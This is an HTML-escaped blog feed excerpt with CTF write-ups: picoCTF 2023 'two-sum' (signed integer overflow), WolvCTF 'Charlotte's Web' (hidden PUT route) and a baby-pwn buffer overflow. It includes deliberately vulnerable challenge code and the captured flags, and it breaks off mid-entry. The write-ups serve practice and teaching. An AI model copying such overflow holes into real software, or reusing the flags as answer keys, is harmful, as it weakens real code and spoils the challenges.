&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if&lt;&#x2F;span&gt;&lt;span&gt;(a &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;amp;&amp;amp;&lt;&#x2F;span&gt;&lt;span&gt; b &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;amp;&amp;amp;&lt;&#x2F;span&gt;&lt;span&gt; result &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;int &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span&gt;() {
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt; num1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt; num2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt; sum&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    FILE &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span&gt;flag&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;char&lt;&#x2F;span&gt;&lt;span&gt; c&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;printf&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;n1 &amp;gt; n1 + n2 OR n2 &amp;gt; n1 + n2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;fflush&lt;&#x2F;span&gt;&lt;span&gt;(stdout)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;printf&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;What two positive numbers can make this possible: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;fflush&lt;&#x2F;span&gt;&lt;span&gt;(stdout)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;scanf&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;%d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;amp;&lt;&#x2F;span&gt;&lt;span&gt;num1) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;amp;&amp;amp; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;scanf&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;%d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;amp;&lt;&#x2F;span&gt;&lt;span&gt;num2)) {
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;printf&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;You entered &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;%d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt; and &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;%d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt; num1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt; num2)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;fflush&lt;&#x2F;span&gt;&lt;span&gt;(stdout)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        sum &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; num1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span&gt; num2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;addIntOvf&lt;&#x2F;span&gt;&lt;span&gt;(sum&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt; num1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt; num2) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;printf&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;No overflow&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;fflush&lt;&#x2F;span&gt;&lt;span&gt;(stdout)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;exit&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        } &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;else if &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;addIntOvf&lt;&#x2F;span&gt;&lt;span&gt;(sum&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt; num1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt; num2) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== -&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;printf&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;You have an integer overflow&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;fflush&lt;&#x2F;span&gt;&lt;span&gt;(stdout)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(num1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;||&lt;&#x2F;span&gt;&lt;span&gt; num2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;            flag &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;fopen&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;flag.txt&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;r&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if&lt;&#x2F;span&gt;&lt;span&gt;(flag &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;NULL&lt;&#x2F;span&gt;&lt;span&gt;){
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;printf&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;flag not found: please run this on the server&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;fflush&lt;&#x2F;span&gt;&lt;span&gt;(stdout)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;exit&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;            }
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;char&lt;&#x2F;span&gt;&lt;span&gt; buf[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;60&lt;&#x2F;span&gt;&lt;span&gt;]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;fgets&lt;&#x2F;span&gt;&lt;span&gt;(buf&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;59&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt; flag)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;printf&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;YOUR FLAG IS: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt; buf)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;fflush&lt;&#x2F;span&gt;&lt;span&gt;(stdout)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;exit&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;We have to input &lt;code&gt;n1 and n2&lt;&#x2F;code&gt;  those satisfies &lt;code&gt;n1 &amp;gt; n1 + n2 OR n2 &amp;gt; n1 + n2&lt;&#x2F;code&gt;. Mathematically this is not possible. But in computer memory its possible.&lt;&#x2F;p&gt;
&lt;p&gt;This can be done with simple integer overflow.&lt;&#x2F;p&gt;
&lt;p&gt;The &lt;code&gt;n1&lt;&#x2F;code&gt; and &lt;code&gt;n2&lt;&#x2F;code&gt; are declared as signed integers.&lt;&#x2F;p&gt;
&lt;p&gt;Signed int range for&lt;&#x2F;p&gt;
&lt;p&gt;2 bytes(-32,768 to 32,767)
4 bytes(-2,147,483,648 to 2,147,483,647)&lt;&#x2F;p&gt;
&lt;p&gt;If we store &lt;code&gt;2,147,483,648&lt;&#x2F;code&gt; in a signed 4 byte integer it will become &lt;code&gt;-2,147,483,648&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Take &lt;code&gt;n1 = 2,147,483,648&lt;&#x2F;code&gt; &lt;code&gt;n2 = 2,147,483,649&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Here &lt;code&gt;n1&lt;&#x2F;code&gt; becomes &lt;code&gt;-2,147,483,648&lt;&#x2F;code&gt; &lt;code&gt;n2&lt;&#x2F;code&gt; becomes &lt;code&gt;-2,147,483,647&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Therefore, &lt;code&gt;n1 + n2 = -2,147,483,648 + (-2,147,483,647)&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;pico23&#x2F;pico23_twosum1.png&quot; alt=&quot;two-sum&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;But here, &lt;code&gt;n1&amp;gt;0 and n2&amp;gt;0&lt;&#x2F;code&gt; not satisfied. We only get the flag if it does.&lt;&#x2F;p&gt;
&lt;p&gt;So, we can select two numbers whose sum is  &lt;code&gt;2147483648.&lt;&#x2F;code&gt; Then the result will be &lt;code&gt;-2147483648&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Take &lt;code&gt;n1 = 2147483640 and n2 = 8&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Then &lt;code&gt;n1 + n2 = 2147483648&lt;&#x2F;code&gt; , it will be stored as &lt;code&gt;-2147483648&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;pico23&#x2F;pico23_twosum2.png&quot; alt=&quot;two-sum&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : picoCTF{Tw0_Sum_Integer_Bu773R_0v3rfl0w_fe14e9e9}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;hr &#x2F;&gt;
&lt;p&gt;For all the solved challenges &lt;a href=&quot;&#x2F;assets&#x2F;files&#x2F;ctf_files&#x2F;picoctf2023.pdf&quot;&gt;click here&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;hr &#x2F;&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Wolve CTF 2023</title>
        <published>2023-03-18T00:00:00+00:00</published>
        <updated>2023-03-18T00:00:00+00:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="https://themj0ln1r.github.io/writeups/wolvctf23/"/>
        <id>https://themj0ln1r.github.io/writeups/wolvctf23/</id>
        
        <content type="html" xml:base="https://themj0ln1r.github.io/writeups/wolvctf23/">&lt;p&gt;I played &lt;a href=&quot;https:&#x2F;&#x2F;wolvctf.io&quot;&gt;WolvCTF 2023&lt;&#x2F;a&gt; with &lt;a href=&quot;https:&#x2F;&#x2F;ctftime.org&#x2F;team&#x2F;217079&quot;&gt;Invaders0x1&lt;&#x2F;a&gt; which is held on March 18, 2023.
These are the writeups for the solved challenges.&lt;&#x2F;p&gt;
&lt;h1 id=&quot;charlotte-s-web&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#charlotte-s-web&quot; aria-label=&quot;Anchor link for: charlotte-s-web&quot;&gt;Charlotte&#x27;s Web&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;wolv23&#x2F;wolv_charlotte.png&quot; alt=&quot;Charlottes_web&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;&#x2F;src&lt;&#x2F;code&gt; is found in source code.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;wolv23&#x2F;wolv_charlotte1.png&quot; alt=&quot;src&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;flag&lt;&#x2F;code&gt; will be opened when we resquest &lt;code&gt;&#x2F;super-secret-route-nobody-will-guess&lt;&#x2F;code&gt; with a &lt;code&gt;PUT&lt;&#x2F;code&gt; method.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;wolv23&#x2F;wolv_charlotte2.png&quot; alt=&quot;Flag&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : wctf{y0u_h4v3_b33n_my_fr13nd___th4t_1n_1t53lf_1s_4_tr3m3nd0u5_th1ng}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h1 id=&quot;baby-pwn&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#baby-pwn&quot; aria-label=&quot;Anchor link for: baby-pwn&quot;&gt;baby-pwn&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;wolv23&#x2F;wolv_babypwn.png&quot; alt=&quot;Baby pwn&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Attached files &lt;a href=&quot;&#x2F;assets&#x2F;files&#x2F;ctf_files&#x2F;wolvctf23&#x2F;baby-pwn.c&quot; download&gt;baby-pwn.c&lt;&#x2F;a&gt; and &lt;a href=&quot;&#x2F;assets&#x2F;files&#x2F;ctf_files&#x2F;wolvctf23&#x2F;baby-pwn&quot; download&gt;baby-pwn.c&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Function present in &lt;code&gt;baby-pwn.c&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;c&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-c &quot;&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;void &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;vuln&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;void&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;volatile int&lt;&#x2F;span&gt;&lt;span&gt; a &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xdeadbeef&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;char&lt;&#x2F;span&gt;&lt;span&gt; buff[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;32&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;{ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0 &lt;&#x2F;span&gt;&lt;span&gt;}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;printf&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Gimme some input: &amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;fgets&lt;&#x2F;span&gt;&lt;span&gt;(buff&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;48&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt; stdin)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(a &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xdeadbeef&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;print_flag&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;	}
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Trying bufferoverflow input string length of 48 in the remote server.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;wolv23&#x2F;wolv_babypwn1.png&quot; alt=&quot;Flag &quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;blockquote&gt;
